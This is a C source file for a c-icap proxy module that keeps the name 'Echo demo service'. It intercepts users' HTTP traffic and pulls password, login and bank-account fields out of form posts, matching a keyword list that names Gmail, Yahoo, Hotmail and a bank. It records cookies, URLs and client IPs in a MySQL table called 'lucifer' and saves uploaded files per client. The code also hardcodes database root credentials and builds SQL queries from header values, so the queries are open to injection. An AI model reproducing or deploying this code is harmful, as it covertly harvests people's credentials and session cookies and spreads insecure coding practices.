#include "common.h"
#include "c-icap.h"
#include "service.h"
#include "header.h"
#include "body.h"
#include "simple_api.h"
#include "debug.h"
#include <time.h>
#include <mysql.h>
// host2ip
#include<string.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<errno.h>
#include<netdb.h>
#include<arpa/inet.h>
#include"zlib.h"
#define INVALID 0
#define FileName_Template "/tmp/NAME_XXXXXX"

//Colors in Debug/Terminal
#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"
int bytedelete=0;
int isupload=0;
int statecode=0;
int echo_init_service(ci_service_xdata_t * srv_xdata, struct ci_server_conf *server_conf);
int echo_check_preview_handler(char *preview_data, int preview_data_len,ci_request_t *);
int echo_end_of_data_handler(ci_request_t * req);
void *echo_init_request_data(ci_request_t * req);
void echo_close_service();
void echo_release_request_data(void *data);
int echo_io(char *wbuf, int *wlen, char *rbuf, int *rlen, int iseof,ci_request_t * req);
char *mergstr(char *str1,char *str2);
int host2ip(char *, char *);
unsigned int ip_to_int (const char * ip);
int str2int(char []);
char * FindCredential(char *InputStr, int  InputStrLen, char *Pattern);
/*
 *
 *
 */
char * FindCredential(char *InputStr, int InputStrLen, char *Pattern){
		char *Word,*token,*FinalStr,MemBuf[1024];
		const char Delimiter[2]="&";
		if (Pattern==NULL)
			return "Error";
		//ci_debug_printf(1,"%sFindCredential()::Pattern=%s%s\n",KYEL,KRED,Pattern);
		token = strtok(InputStr, Delimiter);
		while( token != NULL )
		   {
				//ci_debug_printf(1,"%sFindCredential()::token value=%s%s\n",KYEL,KRED,token );
				if(strstr(token, Pattern))
				{
				  ci_debug_printf(1,"%sFindCredential()::%sMatched String->%s%s\n",KYEL,KBLU,KWHT, token );
				  return token;
				}
				token = strtok(NULL, Delimiter);
		   }

}


char* delblank(char* input)
{
    int i,j;
    char *output=input;
    for (i = 0, j = 0; i<strlen(input); i++,j++)
    {
        if ((input[i]!=' ') && (input[i]!='\''))
            output[j]=input[i];
        else
            j--;
    }
    output[j]=0;
    return output;
}


/* Convert String to Integer*/
int str2int(char a[]) {
		  int c, sign, offset, n;
		  if (a[0] == '-') {  // Handle negative integers
			sign = -1;
		  }
		  if (sign == -1) {  // Set starting position to convert
			offset = 1;
		  }
		  else {
			offset = 0;
		  }
		  n = 0;
		  for (c = offset; a[c] != '\0'; c++) {
			n = n * 10 + a[c] - '0';
		  }
		  if (sign == -1) {
			n = -n;
		  }
		  return n;
}










/* Convert IP to Integer*/
unsigned int ip_to_int (const char * ip)
{
    /* The return value. */
    unsigned v = 0;
    /* The count of the number of bytes processed. */
    int i;
    /* A pointer to the next digit to process. */
    const char * start;
    start = ip;
    for (i = 0; i < 4; i++) {
        /* The digit being processed. */
        char c;
        /* The value of this byte. */
        int n = 0;
        while (1) {
            c = * start;
            start++;
            if (c >= '0' && c <= '9') {
                n *= 10;
                n += c - '0';
            }
            /* We insist on stopping at "." if we are still parsing
               the first, second, or third numbers. If we have reached
               the end of the numbers, we will allow any character. */
            else if ((i < 3 && c == '.') || i == 3) {
                break;
            }
            else {
                return INVALID;
            }
        }
        if (n >= 256) {
            return INVALID;
        }
        v *= 256;
        v += n;
    }
    return v;
}

/*Resolve hotname and return ip*/
int host2ip(char *hostname, char *ip){
	struct hostent *he;
	struct in_addr **addr_list;
	int i;
	if((he=gethostbyname(hostname))==NULL){
		herror("gethostbyname");
		return 1;
	}
	addr_list=(struct in_add **) he->h_addr_list;
	for (i=0; addr_list[i] !=NULL;i++){
		strcpy(ip,inet_ntoa(*addr_list[i]));
		return 0;
	}
	return 1;
}

/*Merge 2 string...*/
char *mergstr(char *str1,char *str2)
{
    char *result = malloc(strlen(str1)+strlen(str2)+1);//+1 for the zero-terminator
	//in real code you would check for errors in malloc here
    strcpy(result, str1);
    strcat(result, str2);
    return result;
}
CI_DECLARE_MOD_DATA ci_service_module_t service = {
     "echo",                         /* mod_name, The module name */
     "Echo demo service",            /* mod_short_descr,  Module short description */
     ICAP_RESPMOD | ICAP_REQMOD,     /* mod_type, The service type is responce or request modification */
     echo_init_service,              /* mod_init_service. Service initialization */
     NULL,                           /* post_init_service. Service initialization after c-icap configured. Not used here */
     echo_close_service,             /* mod_close_service. Called when service shutdowns. */
     echo_init_request_data,         /* mod_init_request_data */
     echo_release_request_data,      /* mod_release_request_data */
     echo_check_preview_handler,     /* mod_check_preview_handler */
     echo_end_of_data_handler,       /* mod_end_of_data_handler */
     echo_io,                        /* mod_service_io */
     NULL,
     NULL
};

/*
  The echo_req_data structure will store the data required to serve an ICAP request.
*/
struct echo_req_data {
    /*the body data*/
    ci_simple_file_t *body;
    /*flag for marking the eof*/
    int eof;
};


/* This function will be called when the service loaded  */
int echo_init_service(ci_service_xdata_t * srv_xdata, struct ci_server_conf *server_conf)
{
     ci_debug_printf(1, "%sInitialization of module.\n",KYEL);
     /*Tell to the icap clients that we can support up to 1024 size of preview data*/
     ci_service_set_preview(srv_xdata, 1024);
     /*Tell to the icap clients that we support 204 responses*/
     ci_service_enable_204(srv_xdata);
     /*Tell to the icap clients to send preview data for all files*/
     ci_service_set_transfer_preview(srv_xdata, "*");
     /*Tell to the icap clients that we want the X-Authenticated-User and X-Authenticated-Groups headers
       which contains the username and the groups in which belongs.  */
     ci_service_set_xopts(srv_xdata,  CI_XAUTHENTICATEDUSER|CI_XAUTHENTICATEDGROUPS);
     return CI_OK;
}

/* This function will be called when the service shutdown */
void echo_close_service() 
{
	ci_debug_printf(1,"Service shutdown.\n");
    /*Nothing to do*/
}

/*This function will be executed when a new request for echo service arrives. This function will
  initialize the required structures and data to serve the request.
 */
void *echo_init_request_data(ci_request_t * req)
{
    struct echo_req_data *echo_data;
    /*Allocate memory fot the echo_data*/
    echo_data = malloc(sizeof(struct echo_req_data));
    if (!echo_data) {
        ci_debug_printf(1, "Memory allocation failed inside echo_init_request_data!\n");
        return NULL;
    }
    echo_data->body = NULL;
     echo_data->eof = 0;
     /*Return to the c-icap server the allocated data*/
     return echo_data;
}

/*This function will be executed after the request served to release allocated data*/
void echo_release_request_data(void *data)
{
    /*The data points to the echo_req_data struct we allocated in function echo_init_service */
    struct echo_req_data *echo_data = (struct echo_req_data *)data;
    /*if we had body data, release the related allocated data*/
    if(echo_data->body) {
        // The ci_simple_file_release will not remove the file
        ci_simple_file_release(echo_data->body);
        // The ci_simple_file_destroy will remove the file.
        //ci_simple_file_destroy(echo_data->body);
    }
    free(echo_data);
}


int echo_check_preview_handler(char *preview_data, int preview_data_len, ci_request_t * req)
{ // Start Function
		ci_off_t content_len;
		char *hostname,DstIP[100];
		MYSQL *conn; /* MySQL connection */
		MYSQL_RES *result; /* result set */
		MYSQL_ROW row; /* an instance of a row from the result */
		char *server = "127.0.0.1"; //MySQL Server
		char *user = "root"; //MySQL User Name
		char *password = "123456"; //MySQL Password
		char *database = "icap"; //DB Name
		char *CookieValue, *Hostvalue, *UserAgentvalue;
		char *Content_Encoding=NULL,*Transfer_Encoding=NULL,*Path;
		/*Make Mysql query*/
		char query[14096],qprefix[1024], qpostfix[9024], *Comment="NULL", *ContentLength=NULL;
		char *value=NULL, *Http_Type=NULL;
		time_t seconds;
		char *POST_GET;
		char *C4ZCT=ci_http_request_get_header(req, "Content-Encoding");
		char *R4ZCT=ci_http_response_get_header(req, "Content-Encoding");
		char Buffer[1024],ZIPBUFF[1024];
		int BufLen,i,Result,x;
		char *REQ, URLADD[1024],template[] = "TMP_XXXXXX", FN[4000];
		unsigned intsrcIP,intdstIP;
		char sdir[2048],DirName[1024],URL[1204], *pch, *SelectedName,SNTemp[1024];
		char Time[100], FolderName[1024],*RepHostName, *ImportInformation="No key information",*tempbuffer;
		char *FinalResulat,ListFinal[18000];
		int checksum;
		char *Name_Upload[1024];
		/*
		 *                Set default value
		 */
		ListFinal[0]='\0';	// if not math anything, insert null in database
		statecode=0; 		// if statecode equal 1946 then we understand in upload mode
		isupload=0;			// if isupload equal 1 then we are in upload (1946) and file transfer mode. (strstr(buffer, "filenmame="))
		bytedelete=0;		// N byte will be delete in uploading files header.


		/*Get the echo_req_data we allocated using the  echo_init_service  function*/
		struct echo_req_data  *echo_data = ci_service_data(req);
		/*If there are is a Content-Length header in encupsulated Http object read it
		and display a debug message (used here only for debuging purposes)*/
		content_len = ci_http_content_length(req);
		ci_debug_printf(9, "We expect to read :%" PRINTF_OFF_T " body data\n",(CAST_OFF_T) content_len);
		/*If there are not body data in HTTP encapsulated object but only headers
		respond with Allow204 (no modification required) and terminate here the
		ICAP transaction */
		if(!ci_req_hasbody(req))
			return CI_MOD_ALLOW204;
		/*Unlock the request body data so the c-icap server can send data before all body data has received */
		ci_req_unlock_data(req);
		const char *username, *clientIP;
		char *backup_buffer=(char*) malloc(sizeof(char)*preview_data_len);
		memcpy(backup_buffer,preview_data,preview_data_len);
		int backup_buffer_len=preview_data_len;


		ci_headers_list_t *icapHeads = req->request_header;
		if ((username =  ci_headers_value(icapHeads, (char *)"X-Client-Username"))){
			ci_debug_printf(1,"%sClient Username=%s%s\n",KYEL,KRED,username);
		}
		if ((clientIP =  ci_headers_value(icapHeads, (char *)"X-Client-IP"))){
			ci_debug_printf(1,"%sClient IP=%s%s\n",KYEL,KRED,clientIP);
		}
		const char *content_type = ci_http_response_get_header(req, "Content-Type");
		ci_debug_printf(1,"%sContent Type=%s%s\n",KYEL,KRED, content_type);
/*
*  Reassemble Download Managers/Downloading/Partial Content
*  How to?
*  Simple Script or line of source code that reassemble and create new file based on size byte has bee recorded.but there is some issue
*  for example when the end user pause the IDM and start downlozd after days or councurret user behiend NAT download same file, etc
*  Reassembling e.g
*  RESPONSE <- bytes 1-16851678/16851679
*  RESPONSE <- bytes 3370335-6740670/16851679
*  RESPONSE <- bytes 6740671-10111006/16851679
*  RESPONSE <- bytes 10111007-13481342/16851679
*  RESPONSE <- bytes 13481343-16851678/16851679
*
*/
		// if requesting in Partial Content mode.
		char *IDM;
		IDM=ci_http_request_get_header(req,"Range:");
		if (IDM){
					ci_debug_printf(1,"%sHTTP Request[Partial], Content Range is a =%s%s\n",KYEL,KBLU,IDM);
					char *msg_req="REQUEST -> ";
					char *buffer_ptr;
					int totalsize=strlen(msg_req)+strlen(IDM);
					buffer_ptr=malloc(sizeof(char)*totalsize);
					buffer_ptr[0]='\0';
					strncat(buffer_ptr,msg_req,strlen(msg_req));
					strncat(buffer_ptr,IDM,strlen(IDM));
					Comment=malloc(sizeof(char)*strlen(buffer_ptr));
					strncpy(Comment,buffer_ptr,strlen(buffer_ptr));
					free(buffer_ptr);
		}
		// if downloading in Partial Content mode.
		char *Download_Status;
		Download_Status = ci_http_response_get_header(req, "Content-range");
		if (Download_Status){
					//Comment="Downloading/Partial Content";
					char *msg_resp="RESPONSE <- ";
					ci_debug_printf(1,"%sHTTP Response[Partial Content], Content Range is a =%s%s\n",KYEL,KBLU, IDM);
					char *buffer_ptr;
					int totalsize=strlen(msg_resp)+strlen(Download_Status);
					buffer_ptr=malloc(sizeof(char)*totalsize);
					buffer_ptr[0]='\0';
					strncat(buffer_ptr,msg_resp,strlen(msg_resp));
					strncat(buffer_ptr,Download_Status,strlen(Download_Status));
					Comment=malloc(sizeof(char)*strlen(buffer_ptr));
					strncpy(Comment,buffer_ptr,strlen(buffer_ptr));
					free(buffer_ptr);
		}
		/* if uploading detect */
		const char *up_content_type = ci_http_request_get_header(req, "Content-Type");
		if ((up_content_type && ((strstr(up_content_type,"multipart/form-data"))||(strstr(up_content_type,"application/x-www-form-urlencoded"))))	)
		{//*_+
				Comment="Uploading Form/Data";
				statecode=1946;
				//isupload=1;
				// Yahoo! , Gmail, BankSepah, WordPress,hotmail!
				char *CredentialTable[]={
						"pwd","loginfmt","Email=","username=","User=","Username=",
						"accPassword=","accountNumber","passwd=","Passwd=","pwd",
						"log","usr","password"};
				char tmp[1024];
				memset(tmp,NULL,1024);
				int ListLength=sizeof(CredentialTable)/sizeof(*CredentialTable);
				char Match_Buffer[preview_data_len];
				int k;
				ListFinal[0]='\0';
				if (strstr(preview_data,"'")){ // ' cause crashing MySQL query, so we define const string for issue.
					ImportInformation="[!] Keyword Found, Check manually";
					strncat(ListFinal,ImportInformation,strlen(ImportInformation));
				}else{ // Safe, printable string found...
							for (k=0;k<=ListLength-1;k++){ // Copy String to buffer and send back to function for keywords matching
													for (i=0;i<=preview_data_len;i++){
														Match_Buffer[i]=preview_data[i];
													}
													strcpy(tmp,CredentialTable[k]);
													ci_debug_printf(1,"%stmp=%s%s\n",KYEL,KRED,tmp);
													ImportInformation=FindCredential(&Match_Buffer,sizeof(Match_Buffer), &tmp );
													if(ImportInformation!=NULL)
													{
															strncat(ListFinal,ImportInformation,strlen(ImportInformation));
															strncat(ListFinal,"|",2);
													}

							}
				}//End of else.
		}//*_+

		char *CE=NULL,*TE=NULL;
		if((CE=ci_http_request(req)))
			if ((CE=ci_http_response_get_header(req,"Content-Encoding"))){
				Content_Encoding=CE;
			}
			if ((TE=ci_http_response_get_header(req,"Transfer-Encoding"))){
				Transfer_Encoding=TE;
			}

		if ((content_type!=NULL) ||(up_content_type!=NULL) )
		{ //Start Meionel
								ci_debug_printf(1,"%s+++++++++++++++++++++++++++++++++++++++++++++++++\n",KGRN);
								ci_debug_printf(1,"%sService call.\nProcess the request...\n",KYEL,KYEL);
								//Lucifer
								if (ci_req_hasbody(req)) {
											snprintf(DirName,1024,"/var/tmp/%s",clientIP);
											if(!(mkdir(DirName,S_IRWXU)))
												ci_debug_printf(1,"%sWarning!%serror create Client-IP directory.\n",KRED,KYEL);
											//echo_data->body = ci_simple_file_named_new(sdir, NULL, 0);
											snprintf(sdir,1024, "/var/tmp/%s", clientIP);
											Path=sdir;
											/*GET THE URL, Splite and make SelectedName */
											ci_http_request_url(req,URL, 1024);
											pch = strtok (URL,"/");
											while (pch != NULL){
													 SelectedName=pch;
													 pch = strtok (NULL, "/");
												}
											if ((strlen(SelectedName)>=54)){
												ci_debug_printf(1,"%sSelectedName {File name} big than 256 char, use partial name.\n",KYEL);
												memset(SNTemp,'\0',sizeof(SelectedName));
												strncpy(SNTemp, SelectedName, 53);
												SelectedName=SNTemp;
												ci_debug_printf(1,"%snew selectedname=%s%s\n",KYEL,KRED,SelectedName);
												}
											time_t now = time(NULL);
											struct tm *t = localtime(&now);
											strftime(Time, sizeof(Time)-1, "%d%m%Y%H%M", t);
											if ((RepHostName=ci_http_request_get_header(req,"Host")))
													snprintf(FolderName,1024,"/var/tmp/%s/{%s}{%s}", clientIP,Time,RepHostName);
											if (!(RepHostName=ci_http_request_get_header(req,"Host"))){
													ci_debug_printf(1,"%sCan not obtain the Host name :-( \nUsing simple Time base name... ",KYEL);
													snprintf(FolderName,1024,"/var/tmp/%s/T%s", clientIP,Time);
											}
											ci_debug_printf(1,"%sfoldername:%s%s\n",KYEL,KRED,FolderName);
											Path=FolderName;
											if(!(mkdir(FolderName,S_IRWXU)))
											{
												ci_debug_printf(1,"%sWarning:%sError creating folder or directory. Folder is exist.\n",KRED,KYEL);
											}
											snprintf(sdir,2048, "%s/%s@",FolderName,SelectedName);
											mktemp(template);
											ci_debug_printf(1,"%smktemp()= %s%s\n",KYEL,KRED,template);
											snprintf(FN,2048, "%s@%s",SelectedName,template);

											if ((statecode==1946 ) &&(strstr(preview_data,"Content-Type:"))&& (strstr(preview_data,"filename=")))
											{//Uploading...
														/*
														 * if uploading, creat new name
														 */
														const char *lineConst; // the "input string"
														char line[strlen(preview_data)];  // where we will put a copy of the input
														char *subString; // the "result"
														lineConst=strstr(preview_data, "filename=");
														int sizeforfname=0;
														if(lineConst!=NULL){
																strncpy(line, lineConst,strlen(lineConst));
																subString = strtok(line,"\""); // find the first double quote
																subString=strtok(NULL,"\"");   // find the second double quote
																ci_debug_printf(1,"%s atachemnt file name=>%s%s\n",KYEL,KBLU, subString);
																/*
																 *
																 */
																char *substr1="Content-Type:";
																char *ptr1,*next1;
																ptr1=strstr(backup_buffer,substr1);
																if (ptr1!=NULL){
																	while (1==1){
																		  ptr1 += strlen(substr1);
																		  next1=ptr1;
																		  next1=strstr(ptr1,substr1);
																		  if (next1!=NULL)
																		  ptr1=next1;
																		  if (next1==NULL)
																		  break;
																		}
																	sizeforfname=ptr1-backup_buffer;
																	ci_debug_printf(1,"%s ptr size for file name  =>%s%d\n",KYEL,KBLU, sizeforfname);
																}
														}
														snprintf(FolderName,20,"/var/dd");
														ci_debug_printf(1,"%s sizeforfname  =>%s%d\n",KYEL,KWHT, sizeforfname);
														if (sizeforfname>0)
														{
															isupload=1;
															bytedelete=sizeforfname;
															snprintf(FN,2048, "%s@%s",subString,template);
															snprintf(Name_Upload,1024,"%s@%s",subString,template);
														}else{
															snprintf(FN,2048, "%s@%s",subString,template);
															snprintf(Name_Upload,1024,"%s@%s",subString,template);
														}


														delblank(Name_Upload);//Remove space in file name
														delblank(FN);// Remove space in file name
											}//uploading.
											// FN is a unique filename has been generated by SelectedName and template mix.
											echo_data->body = ci_simple_file_named_new(FolderName,FN, 0);
															time_t rawtime;  struct tm * timeinfo;time ( &rawtime );  timeinfo = localtime ( &rawtime );
															if (ci_http_request_url(req,URLADD,1024))
																	ci_debug_printf(1,"%sURL:%s%s\n",KYEL,KRED,URLADD);
															if ((value=ci_http_request_get_header(req,"Cookie")))
																	CookieValue=value;
															if ((value=ci_http_request_get_header(req,"Host")))
															{
																	Hostvalue=value;
																	hostname=value;
																	host2ip(hostname, DstIP);
															}
															if ((value=ci_http_request_get_header(req,"User-Agent")))
																	UserAgentvalue=value;
															if ((value=ci_http_request_get_header(req,"Content-Length")))
																	ContentLength=value;
															REQ=ci_http_request(req);
															/* attempt to connect the server */
															conn = mysql_init(NULL);
															if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0)) {
																	perror(mysql_error(conn));
																	return 0 ;
															}
															if (ci_req_type(req)==ICAP_RESPMOD)
															{
																		value=ci_http_response_get_header(req,"Content-Length");
																		ContentLength=value;
																		if ((CE=ci_http_response_get_header(req,"Content-Encoding"))){
																						Content_Encoding=CE;
																					}
																		if ((TE=ci_http_response_get_header(req,"Transfer-Encoding"))){
																						Transfer_Encoding=TE;
																					}
															}
															if (ci_req_type(req)==ICAP_REQMOD)
															{

																		value=ci_http_request_get_header(req,"Content-Length");
																		ContentLength=value;
																		if ((CE=ci_http_request_get_header(req,"Content-Encoding"))){
																						Content_Encoding=CE;
																					}
																		if ((TE=ci_http_request_get_header(req,"Transfer-Encoding"))){
																						Transfer_Encoding=TE;
																					}
																		content_type=ci_http_request_get_header(req, "Content-Type");

															}

															if (strstr(REQ, "POST")!=NULL)
																POST_GET="POST";
															if (strstr(REQ, "GET")!=NULL)
																POST_GET="GET";
															if (strstr(URLADD,"https://")!=NULL)
																 Http_Type="HTTPS";
															if (strstr(URLADD,"http://")!=NULL)
																 Http_Type="HTTP";
															//time_t seconds;
															seconds = time(NULL);
															intsrcIP = ip_to_int(clientIP);
															intdstIP = ip_to_int(DstIP);
															snprintf(qprefix,1024, "insert into lucifer(DateTime,HttpType,Method,URL,Cookie,SourceIP,Host,DestinationIP,UserAgent,ContentType,Path,FileName,ContentEncoding,TransferEncoding,ContentLength,Comment,ImportInformation) VALUES ");

															if ((statecode==1946 ) &&(strstr(preview_data,"Content-Type:"))){
																	ci_debug_printf(1,"%sStatecode==1946,  Name_Uplaod is a: %s%s\n",KYEL,KMAG,Name_Upload);
																	Path="/var/final";
																	snprintf(qpostfix,9024,"('%ld','%s','%s','%s','%s','%u','%s','%u','%s','%s','%s','%s','%s','%s','%s','%s','%s');",seconds,Http_Type,POST_GET,URLADD,CookieValue,intsrcIP,Hostvalue,intdstIP,UserAgentvalue,content_type,Path,Name_Upload,Content_Encoding,Transfer_Encoding,ContentLength,Comment,ListFinal);
															}
															else{//if (statecode!=1946)
																snprintf(qpostfix,9024,"('%ld','%s','%s','%s','%s','%u','%s','%u','%s','%s','%s','%s','%s','%s','%s','%s','%s');",seconds,Http_Type,POST_GET,URLADD,CookieValue,intsrcIP,Hostvalue,intdstIP,UserAgentvalue,content_type,Path,FN,Content_Encoding,Transfer_Encoding,ContentLength,Comment,ListFinal);
															}
															snprintf(query,14096,"%s%s",qprefix,qpostfix);
															ci_debug_printf(1,"%sSQL: %s%s\n",KYEL,KMAG,query);
															/* run the SQL query */
															if (mysql_query(conn, query)) {	perror(mysql_error(conn));return 0;	}
															result = mysql_use_result(conn);
															mysql_free_result(result);
															mysql_close(conn);
										} //End of Lucifer
										if (preview_data_len)
										{ //BB112233
											echo_data->eof = ci_req_hasalldata(req);
											// qzip in response
											if((R4ZCT!=NULL) && strstr(R4ZCT,"gzip") ){//R4ZCT
												for (i=0;i<=preview_data_len;i++)
													ZIPBUFF[i]=preview_data[i];
												BufLen	= sizeof(Buffer);
												if (ci_uncompress_preview(CI_ENCODE_GZIP,&ZIPBUFF,sizeof(ZIPBUFF), &Buffer,&BufLen )){
													ci_debug_printf(1,"%sAction->Unziped result:%s%s\n",KYEL,KRED,Buffer);
													FILE *fp;char templ[] = "TMP_XXXXXX";mktemp(templ);	char *FNAME22[4000];
													snprintf(FNAME22,2048, "%s@%s",SelectedName,templ);
													ci_debug_printf(1,"%sfilename:%s%s\n",KYEL,KRED,FNAME22);
													ci_debug_printf(1,"%spath:%s%s\n",KYEL,KRED,Path);
													char Full[4000];
													snprintf(Full, 3000,"%s/%s",Path,FNAME22);
													fp=fopen(Full, "wb");
													ci_debug_printf(1,"%sfullname:%s%s\n",KYEL,KRED,Full);
													fwrite(Buffer,sizeof(Buffer),1, fp);
													fclose(fp);
													Comment="Unziped.";
													snprintf(qprefix,1024, "insert into lucifer(DateTime,HttpType,Method,URL,Cookie,SourceIP,Host,DestinationIP,UserAgent,ContentType,Path,FileName,ContentEncoding,TransferEncoding,ContentLength,Comment,ImportInformation) VALUES ");
													if ((statecode==1946 ) &&(strstr(preview_data,"Content-Type:"))){
															ci_debug_printf(1,"%sStatecode==1946,  Name_Uplaod is a: %s%s\n",KYEL,KMAG,Name_Upload);
															Path="/var/final";
															snprintf(qpostfix,9024,"('%ld','%s','%s','%s','%s','%u','%s','%u','%s','%s','%s','%s','%s','%s','%s','%s','%s');",seconds,Http_Type,POST_GET,URLADD,CookieValue,intsrcIP,Hostvalue,intdstIP,UserAgentvalue,content_type,Path,Name_Upload,Content_Encoding,Transfer_Encoding,ContentLength,Comment,ListFinal);
													}
													else{ //if (statecode!=1946)
														snprintf(qpostfix,9024,"('%ld','%s','%s','%s','%s','%u','%s','%u','%s','%s','%s','%s','%s','%s','%s','%s','%s');",seconds,Http_Type,POST_GET,URLADD,CookieValue,intsrcIP,Hostvalue,intdstIP,UserAgentvalue,content_type,Path,FNAME22,Content_Encoding,Transfer_Encoding,ContentLength,Comment,ListFinal);
													}
													snprintf(query,14096,"%s%s",qprefix,qpostfix);
													conn = mysql_init(NULL);
													if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0)) {
															perror(mysql_error(conn));
															return 0 ;
													}
													ci_debug_printf(1,"%sSQL: %s%s\n",KYEL,KMAG,query);
													if (mysql_query(conn, query)) {	perror(mysql_error(conn));return 0;	}
													result = mysql_use_result(conn);
													mysql_free_result(result);
													mysql_close(conn);
													Comment="Nothing.";

												}
											}//R4ZCT!=NULL

										// gzip in request
											if((C4ZCT!=NULL) && strstr(C4ZCT,"gzip") ){
																		for (i=0;i<=preview_data_len;i++)
																			ZIPBUFF[i]=preview_data[i];
																		BufLen	= sizeof(Buffer);
																		if (ci_uncompress_preview(CI_ENCODE_GZIP,&ZIPBUFF,sizeof(ZIPBUFF), &Buffer,&BufLen )){
																			ci_debug_printf(1,"%sAction-> Unziped result:%s%s\n",KYEL,KRED,Buffer );
																			FILE *fp;char templ[] = "TMP_XXXXXX";mktemp(templ);char *FNAME22[4000];
																			snprintf(FNAME22,2048, "%s@%s",SelectedName,templ);
																			ci_debug_printf(1,"%sfilename%s%s\n",KYEL,KRED,FNAME22);
																			ci_debug_printf(1,"%spath:%s%s\n",KYEL,KRED,Path);
																			char Full[4000];
																			snprintf(Full, 3000,"%s/%s",Path,FNAME22);
																			fp=fopen(Full, "wb");
																			ci_debug_printf(1,"%sfullname:%s%s\n",KYEL,KRED,Full);
																			fwrite(Buffer,sizeof(Buffer),1, fp);
																			fclose(fp);
																			Comment="Unziped.";
																			snprintf(qprefix,1024, "insert into lucifer(DateTime,HttpType,Method,URL,Cookie,SourceIP,Host,DestinationIP,UserAgent,ContentType,Path,FileName,ContentEncoding,TransferEncoding,ContentLength,Comment,ImportInformation) VALUES ");
																			if ((statecode==1946 ) &&(strstr(preview_data,"Content-Type:"))){
																					ci_debug_printf(1,"%sStatecode==1946,  Name_Uplaod is a: %s%s\n",KYEL,KMAG,Name_Upload);
																					Path="/var/final";
																					snprintf(qpostfix,9024,"('%ld','%s','%s','%s','%s','%u','%s','%u','%s','%s','%s','%s','%s','%s','%s','%s','%s');",seconds,Http_Type,POST_GET,URLADD,CookieValue,intsrcIP,Hostvalue,intdstIP,UserAgentvalue,content_type,Path,Name_Upload,Content_Encoding,Transfer_Encoding,ContentLength,Comment,ListFinal);
																			}
																			else{
																				snprintf(qpostfix,9024,"('%ld','%s','%s','%s','%s','%u','%s','%u','%s','%s','%s','%s','%s','%s','%s','%s','%s');",seconds,Http_Type,POST_GET,URLADD,CookieValue,intsrcIP,Hostvalue,intdstIP,UserAgentvalue,content_type,Path,FNAME22,Content_Encoding,Transfer_Encoding,ContentLength,Comment,ListFinal);
																			}

																			snprintf(query,14096,"%s%s",qprefix,qpostfix);
																			conn = mysql_init(NULL);
																			if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0)) {
																					perror(mysql_error(conn));
																					return 0 ;
																			}
																			ci_debug_printf(1,"%sSQL: %s%s\n",KYEL,KMAG,query);
																			if (mysql_query(conn, query)) {	perror(mysql_error(conn));return 0;	}
																			result = mysql_use_result(conn);
																			mysql_free_result(result);
																			mysql_close(conn);
																			Comment="Nothing.";

																		}
																	}//C4ZCT!=NULL
													if (statecode==1946)
													{//^_^
														char *substr="Content-Type:";
														char *ptr,*next;
														ptr=strstr(backup_buffer,substr);
														if (ptr!=NULL){//ptr condition
															char *membuf;
															while (1==1){
																  ptr += strlen(substr);
																  next=ptr;
																  next=strstr(ptr,substr);
																  if (next!=NULL)
																  ptr=next;
																  if (next==NULL)
																  break;
																}
															//ptr += strlen(substr);
															ci_debug_printf(1,"%sptr size  =>%s%d\n",KYEL,KBLU, ptr-backup_buffer);
															int asize=backup_buffer_len -(ptr-backup_buffer);
															membuf=(char*) malloc(sizeof(char) * asize);
															if (membuf){
																ci_debug_printf(1,"%sbackup_buffer orginal value =>%s%s\n",KYEL,KBLU, backup_buffer);
																memcpy(membuf,ptr,asize);
																backup_buffer=(char*) malloc(sizeof(char) * backup_buffer_len);
																memcpy(backup_buffer,membuf,asize);
																backup_buffer_len=asize;// if enable, the proxy not working well, else file corruption
																ci_debug_printf(1,"%smembuf =>%s%s\n",KYEL,KBLU, membuf);
																ci_debug_printf(1,"%sbackup_buffer changed value =>%s%s\n",KYEL,KBLU, backup_buffer);
																ci_debug_printf(1,"%sasize  =>%s%d\n",KYEL,KBLU, asize);
																free(membuf);
															}
														}// ptr condition
													}//^_^
													int res;
													res=ci_simple_file_write(echo_data->body, preview_data, preview_data_len, echo_data->eof,isupload, bytedelete);
													ci_debug_printf(1,"%s-> ci_simple_file_write resualt:%d\n",KBLU,res);
										}//BB112233
										return CI_MOD_CONTINUE;
		}//if Meionel
		else
		{//Else of Meionel
						/*Nothing to do just return an allow204 (No modification) to terminate here the ICAP transaction */
						ci_debug_printf(8, "Allow 204...\n");
						return CI_MOD_ALLOW204;
		} //End of Meionel
}//End of function
/*
 *
 *
 *
 *
 */
/* This function will called if we returned CI_MOD_CONTINUE in  echo_check_preview_handler
 function, after we read all the data from the ICAP client*/
int echo_end_of_data_handler(ci_request_t * req)
{
    struct echo_req_data *echo_data = ci_service_data(req);
    /*mark the eof*/
    echo_data->eof = 1;
    /*and return CI_MOD_DONE */
     return CI_MOD_DONE;
}

/* This function will called if we returned CI_MOD_CONTINUE in  echo_check_preview_handler
   function, when new data arrived from the ICAP client and when the ICAP client is 
   ready to get data.
*/
int echo_io(char *wbuf, int *wlen, char *rbuf, int *rlen, int iseof,ci_request_t * req)
{
	int ret;
	struct echo_req_data *echo_data = ci_service_data(req);
	ret = CI_OK;
	/*write the data read from icap_client to the echo_data->body*/
	if(rlen && rbuf) {
		//ci_debug_printf(1,"%s echo_io()::rbuf value =>%s%s\n",KYEL,KBLU,rbuf);
		*rlen = ci_simple_file_write(echo_data->body, rbuf, *rlen, iseof,isupload,bytedelete);

		if (*rlen < 0)
		ret = CI_ERROR;
	}
	/*read some data from the echo_data->body and put them to the write buffer to be send
	to the ICAP client*/
	if (wbuf && wlen) {
	  *wlen = ci_simple_file_read(echo_data->body, wbuf, *wlen);
	}
	if(*wlen==0 && echo_data->eof==1)
		*wlen = CI_EOF;

	return ret;
}
